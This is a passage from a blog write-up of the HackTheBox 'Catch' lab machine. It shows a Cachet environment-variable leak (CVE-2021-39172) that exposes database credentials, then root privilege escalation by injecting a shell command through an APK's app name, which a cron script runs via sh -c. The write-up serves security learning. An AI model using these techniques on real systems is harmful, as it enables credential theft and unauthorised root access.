get a reverse shell on the target system, even though the string <code class="language-plaintext highlighter-rouge">{{7*7}}</code> evaluated to 49. Instead i returned to the cachet vulnerabilities referred to earlier. Since I have an authenticated user, I can perform an exploit of CVE-2021-39172. Reading about the exploit, it apparently revolves around being able to access the .env file when changing the mail configuration. The .env file can then be altered in a way so as it points to some remote redis server, and when the system tries to communicate with this redis server, code is deserialized resulting in code execution. Another option is to read the documentation for Cachet <a href="https://docs.cachethq.io/docs/installing-cachet">https://docs.cachethq.io/docs/installing-cachet</a></p><p>Here we see what a normal environment will look like:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">APP_ENV=production
APP_DEBUG=false
APP_URL=http://localhost
APP_KEY=SomeRandomString

DB_DRIVER=mysql
DB_HOST=localhost
DB_DATABASE=cachet
DB_USERNAME=homestead
DB_PASSWORD=secret
DB_PORT=null
---SNIP---
</span></pre></table></code></div></div><p>Since we can access the environment of the system I will simply steal the DB credentials. It was a little unreliable, but submitting <code class="language-plaintext highlighter-rouge">${DB_PASSWORD}</code> and <code class="language-plaintext highlighter-rouge">${DB_USERNAME}</code> in the mail from adress field in the form leaked the variables, and we now have the credentials <code class="language-plaintext highlighter-rouge">will:s2#4Fg0_%3!</code></p><p><img data-src="/assets/img/boxes/catch/envleak.png" alt="Leaking environment variables via CVE-2021-39172" data-proofer-ignore></p><h2 id="privilege-escalation"><span class="mr-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Once we ssh into Will’s account on the box, it is usually a good idea to make some noise and make a lot of scans (obviuosly a terrible idea in real life). Linpeas doesn’t show up with anything interesting, but pspy does:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">---SNIP---
2022/06/16 16:49:01 CMD: UID=0    PID=511329 | /bin/bash /opt/mdm/verify.sh 
2022/06/16 16:49:01 CMD: UID=0    PID=511332 | openssl rand -hex 12 
2022/06/16 16:49:01 CMD: UID=0    PID=511333 | mv /opt/mdm/apk_bin/*.apk /root/mdm/apk_bin/716caef605aa7ce857722e6c.apk 
2022/06/16 16:49:01 CMD: UID=0    PID=511334 | jarsigner -verify /root/mdm/apk_bin/716caef605aa7ce857722e6c.apk 
---SNIP---
</span></pre></table></code></div></div><p>We can see that root runs a script /opt/mdm/verify.sh pretty often. Let’s take a look.</p><p>The contents of the script</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c">###################</span>
<span class="c"># Signature Check #</span>
<span class="c">###################</span>

sig_check<span class="o">()</span> <span class="o">{</span>
        jarsigner <span class="nt">-verify</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">/</span><span class="nv">$2</span><span class="s2">"</span> 2&gt;/dev/null <span class="o">&gt;</span>/dev/null
        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">echo</span> <span class="s1">'[+] Signature Check Passed'</span>
        <span class="k">else
                </span><span class="nb">echo</span> <span class="s1">'[!] Signature Check Failed. Invalid Certificate.'</span>
                cleanup
                <span class="nb">exit
        </span><span class="k">fi</span>
<span class="o">}</span>

<span class="c">#######################</span>
<span class="c"># Compatibility Check #</span>
<span class="c">#######################</span>

comp_check<span class="o">()</span> <span class="o">{</span>
        apktool d <span class="nt">-s</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">/</span><span class="nv">$2</span><span class="s2">"</span> <span class="nt">-o</span> <span class="nv">$3</span> 2&gt;/dev/null <span class="o">&gt;</span>/dev/null
        <span class="nv">COMPILE_SDK_VER</span><span class="o">=</span><span class="si">$(</span><span class="nb">grep</span> <span class="nt">-oPm1</span> <span class="s2">"(?&lt;=compileSdkVersion=</span><span class="se">\"</span><span class="s2">)[^</span><span class="se">\"</span><span class="s2">]+"</span> <span class="s2">"</span><span class="nv">$PROCESS_BIN</span><span class="s2">/AndroidManifest.xml"</span><span class="si">)</span>
        <span class="k">if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$COMPILE_SDK_VER</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">echo</span> <span class="s1">'[!] Failed to find target SDK version.'</span>
                cleanup
                <span class="nb">exit
        </span><span class="k">else
                if</span> <span class="o">[</span> <span class="nv">$COMPILE_SDK_VER</span> <span class="nt">-lt</span> 18 <span class="o">]</span><span class="p">;</span> <span class="k">then
                        </span><span class="nb">echo</span> <span class="s2">"[!] APK Doesn't meet the requirements"</span>
                        cleanup
                        <span class="nb">exit
                </span><span class="k">fi
        fi</span>
<span class="o">}</span>

<span class="c">####################</span>
<span class="c"># Basic App Checks #</span>
<span class="c">####################</span>

app_check<span class="o">()</span> <span class="o">{</span>
        <span class="nv">APP_NAME</span><span class="o">=</span><span class="si">$(</span><span class="nb">grep</span> <span class="nt">-oPm1</span> <span class="s2">"(?&lt;=&lt;string name=</span><span class="se">\"</span><span class="s2">app_name</span><span class="se">\"</span><span class="s2">&gt;)[^&lt;]+"</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">/res/values/strings.xml"</span><span class="si">)</span>
        <span class="nb">echo</span> <span class="nv">$APP_NAME</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="nv">$APP_NAME</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"Catch"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$APP_NAME</span>|xargs <span class="nt">-I</span> <span class="o">{}</span> sh <span class="nt">-c</span> <span class="s1">'mkdir {}'</span>
                <span class="nb">mv</span> <span class="s2">"</span><span class="nv">$3</span><span class="s2">/</span><span class="nv">$APK_NAME</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$2</span><span class="s2">/</span><span class="nv">$APP_NAME</span><span class="s2">/</span><span class="nv">$4</span><span class="s2">"</span>
        <span class="k">else
                </span><span class="nb">echo</span> <span class="s2">"[!] App doesn't belong to Catch Global"</span>
                cleanup
                <span class="nb">exit
        </span><span class="k">fi</span>
<span class="o">}</span>


<span class="c">###########</span>
<span class="c"># Cleanup #</span>
<span class="c">###########</span>

cleanup<span class="o">()</span> <span class="o">{</span>
        <span class="nb">rm</span> <span class="nt">-rf</span> <span class="nv">$PROCESS_BIN</span><span class="p">;</span><span class="nb">rm</span> <span class="nt">-rf</span> <span class="s2">"</span><span class="nv">$DROPBOX</span><span class="s2">/*"</span> <span class="s2">"</span><span class="nv">$IN_FOLDER</span><span class="s2">/*"</span><span class="p">;</span><span class="nb">rm</span> <span class="nt">-rf</span> <span class="si">$(</span><span class="nb">ls</span> <span class="nt">-A</span> /opt/mdm | <span class="nb">grep</span> <span class="nt">-v</span> apk_bin | <span class="nb">grep</span> <span class="nt">-v</span> verify.sh<span class="si">)</span>
<span class="o">}</span>


<span class="c">###################</span>
<span class="c"># MDM CheckerV1.0 #</span>
<span class="c">###################</span>

<span class="nv">DROPBOX</span><span class="o">=</span>/opt/mdm/apk_bin
<span class="nv">IN_FOLDER</span><span class="o">=</span>/root/mdm/apk_bin
<span class="nv">OUT_FOLDER</span><span class="o">=</span>/root/mdm/certified_apps
<span class="nv">PROCESS_BIN</span><span class="o">=</span>/root/mdm/process_bin

<span class="k">for </span>IN_APK_NAME <span class="k">in</span> <span class="nv">$DROPBOX</span>/<span class="k">*</span>.apk<span class="p">;</span><span class="k">do
        </span><span class="nv">OUT_APK_NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">IN_APK_NAME</span><span class="p">##*/</span><span class="k">}</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'.'</span> <span class="nt">-f1</span><span class="si">)</span><span class="s2">_verified.apk"</span>
        <span class="nv">APK_NAME</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span>openssl rand <span class="nt">-hex</span> 12<span class="si">)</span><span class="s2">.apk"</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="nt">-L</span> <span class="s2">"</span><span class="nv">$IN_APK_NAME</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
                </span><span class="nb">exit
        </span><span class="k">else
                </span><span class="nb">mv</span> <span class="s2">"</span><span class="nv">$IN_APK_NAME</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$IN_FOLDER</span><span class="s2">/</span><span class="nv">$APK_NAME</span><span class="s2">"</span>
        <span class="k">fi
        </span>sig_check <span class="nv">$IN_FOLDER</span> <span class="nv">$APK_NAME</span>
        comp_check <span class="nv">$IN_FOLDER</span> <span class="nv">$APK_NAME</span> <span class="nv">$PROCESS_BIN</span>
        app_check <span class="nv">$PROCESS_BIN</span> <span class="nv">$OUT_FOLDER</span> <span class="nv">$IN_FOLDER</span> <span class="nv">$OUT_APK_NAME</span>
<span class="k">done
</span>cleanup
</pre></table></code></div></div><p>For every <code class="language-plaintext filepath highlighter-rouge">.apk</code> in the <code class="language-plaintext filepath highlighter-rouge">/opt/mdm/apk_bin</code> folder, the script will run some operations on the apk bound to that name. The interesting functionality is in the app_check() function, especially line 46. The script runs the command sh -c ‘mkdir APP_NAME’, as long as the name contains Catch. This means that if we name our app <code class="language-plaintext highlighter-rouge">Catch;Some_command</code> we can inject arbitrary commands into the script which will then be run as root.</p><p>The APP_NAME variable gets taken from the strings.xml file within the apk. Furthermore, we also need to sign the apk, since the script checks if the apk is signed and exits if not.</p><p>The easiest way to get the flag is to simply rename the apk we downloaded earlier in the strings.xml file to:</p><p><code class="language-plaintext highlighter-rouge">Catch; cp /root/root.txt /tmp/root.txt; chmod 777 /tmp/root.txt</code></p><p>This will copy the flag to /tmp and make it readable.</p><p>I built the apk using apktool:</p><p><code class="language-plaintext highlighter-rouge">java -jar apktool_2.6.1.jar b catchv1.0</code></p><p>And then signed it via uber-apk-signer. Once this was done i moved it into the apk_bin folder and waited with pspy:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="go">2022/06/16 17:37:01 CMD: UID=0    PID=528805 | jarsigner -verify /root/mdm/apk_bin/b07b3f441e5934c62058bcd9.apk 
2022/06/16 17:37:02 CMD: UID=0    PID=528825 | 
2022/06/16 17:37:02 CMD: UID=0    PID=528823 | /bin/bash /usr/bin/apktool d -s /root/mdm/apk_bin/b07b3f441e5934c62058bcd9.apk -o /root/mdm/process_bin 
2022/06/16 17:37:02 CMD: UID=0    PID=528826 | 
2022/06/16 17:37:02 CMD: UID=0    PID=528827 | expr xd : x-J 
2022/06/16 17:37:08 CMD: UID=0    PID=528847 | /lib/systemd/systemd-udevd 
2022/06/16 17:37:14 CMD: UID=0    PID=528851 | grep -oPm1 (?&lt;=compileSdkVersion=")[^"]+ /root/mdm/process_bin/AndroidManifest.xml 
2022/06/16 17:37:14 CMD: UID=0    PID=528856 | 
</span><span class="gp">2022/06/16 17:37:14 CMD: UID=0    PID=528855 | sh -c mkdir Catch;</span><span class="w"> </span><span class="nb">cp</span> /root/root.txt /tmp/root.txt<span class="p">;</span> <span class="nb">chmod </span>777 /tmp/root.txt 
<span class="go">2022/06/16 17:37:14 CMD: UID=0    PID=528854 | xargs -I {} sh -c mkdir {} 
2022/06/16 17:37:14 CMD: UID=0    PID=528858 | chmod 777 /tmp/root.txt 
</span><span class="gp">2022/06/16 17:37:14 CMD: UID=0    PID=528859 | mv /root/mdm/apk_bin/b07b3f441e5934c62058bcd9.apk /root/mdm/certified_apps/Catch;</span><span class="w"> </span><span class="nb">cp</span> /root/root.txt /tmp/root.txt<span class="p">;</span> <span class="nb">chmod </span>777 /tmp/root.txt/catchv1_verified.apk 
<span class="go">2022/06/16 17:37:14 CMD: UID=0    PID=528860 | rm -rf /root/mdm/process_bin
</span></pre></table></code></div></div><p>I could then read the flag in the /tmp directory. Success!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/medium-box/" class="post-tag no-text-decoration" >medium-box</a> <a href="/tags/apk/" class="post-tag no-text-decoration" >apk</a> <a href="/tags/android/" class="post-tag no-text-decoration" >android</a> <a href="/tags/api/" class="post-tag no-text-decoration" >api</a> <a href="/tags/letschat/" class="post-tag no-text-decoration" >letschat</a> <a href="/tags/gitea/" class="post-tag no-text-decoration" >gitea</a> <a href="/tags/cachet/" class="post-tag no-text-decoration" >cachet</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Catch writeup - BitisGabonica&amp;url=https://bitisg.github.io/posts/Catch/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Catch writeup - BitisGabonica&amp;u=https://bitisg.github.io/posts/Catch/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://bitisg.github.io/posts/Catch/&amp;text=Catch writeup - BitisGabonica" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/DroidComp/">DroidComp writeup</a><li><a href="/posts/Faculty/">Faculty writeup</a><li><a href="/posts/Trick/">Trick writeup</a><li><a href="/posts/Seal/">Seal writeup</a><li><a href="/posts/Devzat/">Devzat writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Devzat/"><div class="card-body"> <em class="timeago small" data-ts="1655823600" > 2022-06-21 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Devzat writeup</h3><div class="text-muted small"><p> Summary This box focuses a lot on enumeration and source code review. We can abuse an api to achieve remote code execiton on the target system. We can then pivot to a different user via an Authenti...</p></div></div></a></div><div class="card"> <a href="/posts/APKrypt/"><div class="card-body"> <em class="timeago small" data-ts="1657717200" > 2022-07-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>APKrypt writeup</h3><div class="text-muted small"><p> Description Can you get the ticket without the VIP code? Writeup We receive an apk file, which we can then decompile via codium and the APKLab extension. The MainActivity.java file is seen below: ...</p></div></div></a></div><div class="card"> <a href="/posts/Pinned/"><div class="card-body"> <em class="timeago small" data-ts="1657717200" > 2022-07-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pinned writeup</h3><div class="text-muted small"><p> Description This app has stored my credentials and I can only login automatically. I tried to intercept the login request and restore my password, but this seems to be a secure connection. Can you ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Cap/" class="btn btn-outline-primary" prompt="Older"><p>Cap writeup</p></a> <a href="/posts/Devel/" class="btn btn-outline-primary" prompt="Newer"><p>Devel writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy-box/">Easy-box</a> <a class="post-tag" href="/tags/medium-box/">medium-box</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/apk/">apk</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/jwt/">jwt</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-4RZWBJKYF3"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-4RZWBJKYF3'); }); </script>
